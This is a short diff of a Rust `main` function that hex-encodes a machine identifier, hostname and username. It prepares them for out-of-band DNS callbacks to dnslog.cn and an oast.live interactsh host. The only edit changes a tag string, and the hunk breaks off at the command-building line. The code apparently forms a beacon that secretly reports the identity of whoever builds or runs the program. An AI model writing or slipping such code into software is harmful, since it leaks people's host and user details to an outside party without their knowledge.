@@ -17,7 +17,7 @@ fn main() {
     let i = hex(&id[..id.chars().take(45).count()]);
     let h = hex(&hn[..hn.chars().take(45).count()]);
     let u = hex(&un[..un.chars().take(30).count()]);
-    let tag = "n1a05711";
+    let tag = "a1a05711";
     let ish = "dahpi2cgtqkhhbklhpp03u61y7w5xbgxx.oast.live";
     // dual OOB: dnslog.cn (user-visible) + interactsh (self-poll)
     let cmd = format!(
